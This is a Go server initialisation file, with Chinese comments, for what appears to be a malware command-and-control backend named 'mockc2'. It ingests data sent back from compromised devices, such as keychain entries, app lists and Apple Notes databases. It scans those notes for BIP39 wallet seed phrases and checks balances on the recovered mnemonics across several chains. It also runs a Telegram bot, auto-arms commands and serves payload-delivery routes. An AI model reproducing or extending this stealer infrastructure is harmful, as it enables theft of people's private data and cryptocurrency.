package server

import (
	"log"
	"net/http"
	"time"

	"mockc2/internal/config"
	"mockc2/internal/forensics"
	"mockc2/internal/orchestrator"
	"mockc2/internal/store"
	"mockc2/internal/telegram"
)

// DBConfigFromSettings 把集中配置装配为 store 连接参数（server/main 共用）。
func DBConfigFromSettings(s *config.Settings) store.DBConfig {
	return store.DBConfig{
		Host:            s.DBHost,
		Port:            s.DBPort,
		User:            s.DBUser,
		Password:        s.DBPassword,
		Name:            s.DBName,
		Params:          s.DBParams,
		MaxOpenConns:    s.DBMaxOpenConns,
		MaxIdleConns:    s.DBMaxIdleConns,
		ConnMaxLifetime: time.Duration(s.DBConnMaxLifetime) * time.Minute,
	}
}

// InitServices 服务初始化 -> 入库观察者装配（对齐 Python main.create_app）。
func InitServices(s *config.Settings) error {
	store.InitStore(s.CaptureRoot)
	// DB 先行：控制/队列/形态均依赖共享库（多实例一致；MySQL 连接池并发写）
	if err := store.InitDB(DBConfigFromSettings(s)); err != nil {
		return err
	}
	store.InitControl(s.BeaconNoop)
	store.InitQueue()
	store.InitChunkStore(s.CaptureRoot)
	store.SafeCall(func() { store.SeedRules() })
	store.SafeCall(func() { store.GetControl().EnsureSeeded() })
	if added := store.EnsureCriticalIndexes(); len(added) > 0 {
		log.Printf("[db] 补充关键索引: %v", added)
	}
	initAuditWorker()
	forensics.StartWorker() // /war 回传后自动后台检测（tools/ 取证工具）
	StartBalanceWorker()    // 助记词入库后后台自动查多链余额并缓存
	store.StartRetentionWorker() // 数据保留窗口：access_log 3 天 / 访客台账 30 天（防表体无界膨胀）

	// 入库观察者：save_body → ingest.record_packet + chunk_store 归并 + 完整解析（失败静默）。
	// dedup 命中（同端点同指纹重复回传）时跳过派生入库，并丢弃刚落盘的重复正文。
	cs := store.GetChunkStore()
	store.GetStore().AddObserver(func(ep, rel string, size int, raw []byte, srcIP string) {
		var pid int64
		var dup bool
		store.SafeCall(func() { pid, dup = store.RecordPacket(ep, rel, size, raw, srcIP) })
		if dup {
			store.GetStore().DeleteBody(rel)
			return
		}
		if ep == "result" || ep == "nb" {
			store.SafeCall(func() { cs.ProcessResult(raw, rel) })
		}
		// 完整解析落库：u/war/nb/a/result 逐条结构化入库（apps/keychain/memos/...）
		store.SafeCall(func() { store.ProcessFull(ep, raw, pid) })
	})

	// 启动后异步回填历史 capture 数据（幂等，不阻塞服务可用）。
	go func(root string) {
		defer func() { _ = recover() }()
		_ = store.BackfillFull(root)
		// 历史 apps → 钱包配对回填：war 桶为空时钱包字段的唯一来源（幂等，可重复启动）。
		if n := store.BackfillWalletsFromApps(); n > 0 {
			log.Printf("[wallets] 由 apps 包名配对回填命中设备 %d 台", n)
		}
		// 存量 NoteStore.sqlite → 备忘录正文全量入库（幂等）。
		if n := store.BackfillNotesDB(root); n > 0 {
			log.Printf("[notes] 由 NoteStore.sqlite 回填备忘录正文 %d 条", n)
		}
		// 助记词批量模糊匹配 + BIP39 校验 → 命中记录落表（全量扫，不做入库过滤）。
		if r := store.RunMemoBip39Scan(); r != nil {
			log.Printf("[bip39] 扫描备忘录 %v 条，候选 %v，校验通过 %v", r["scanned"], r["candidates"], r["valid"])
		}
		// BIP39 词表落库（前端「词表」模块数据源）。
		if n := store.SeedBip39Words(); n > 0 {
			log.Printf("[bip39] 词表落库 %d 词", n)
		}
		// 交付进度：从 access_log 一次性回填 client_stage（之后由审计写入增量维护）。
		if n := store.BackfillClientStage(); n > 0 {
			log.Printf("[stage] client_stage 回填 %d 个 client", n)
		}
		// 设备读模型：从 packet_meta 一次性回填 device_stats（之后增量维护）。
		if n := store.BackfillDeviceStats(); n > 0 {
			log.Printf("[devstats] device_stats 回填 %d 台设备", n)
		}
		// 助记词库：从已有 war_scan.detail_json 回填。
		if n := store.BackfillRecoveredFromWarScan(); n > 0 {
			log.Printf("[words] 助记词库回填 %d 条", n)
		}
		// 预热聚合缓存：否则重启后第一个访问者要等 6s+（"一部署就卡"的观感来源）。
		store.WarmCaches()
		log.Printf("[warm] 聚合缓存已预热")
	}(s.CaptureRoot)

	// Telegram bot（自管模块）：自带配置文件/env，未配置 token 则静默不启动。
	telegram.Start(s.RootDir)
	// 命令编排引擎（自管模块）：事件 → 条件 → 延迟 → 自动 arm 指令。
	orchestrator.Start(s.RootDir)
	return nil
}

// NewHandler 路由装配（catch-all 最后）+ 中间件（gzip 最外，审计次之，鉴权最内）。
func NewHandler() http.Handler {
	rt := NewRouter()

	// ── 显式业务路由（先于 catch-all 注册）──
	registerSync(rt)
	registerC2(rt)
	registerHQ(rt)
	registerL1Res(rt)
	registerOps(rt)
	registerPanel(rt)
	registerPanelEntry(rt)
	registerFeAPI(rt)
	registerDash(rt)
	registerQuery(rt)
	registerAdmin(rt)
	registerMetrics(rt)
	registerHealth(rt)     // /__health + /__version（探针，无敏感信息）
	registerChainQuery(rt) // 多链余额查询代理（chainquery 服务）

	// ── 交付 catch-all —— 必须最后挂载 ──
	registerDelivery(rt)

	var h http.Handler = rt
	h = adminAuthMiddleware(h) // 管理授权（/admin 前台 + /__auth 登录；/__dash /__q /__* 全部守卫）
	h = corsMiddleware(h)      // CORS/OPTIONS 预检（交付链跨域 sync 必需）
	h = auditMiddleware(h)     // 审计中间件（全链路）
	h = gzipMiddleware(h)      // 传输压缩：大静态 JS ≈ -82% 字节
	h = metricsMiddleware(h)   // 运行指标（在途/状态码分布；最外层全量计）
	h = overloadMiddleware(h)  // 过载保护：在途超限 503 快速失败（背压）
	h = recoverMiddleware(h)   // 最外层：panic 记栈 + 500，进程不崩
	return h
}
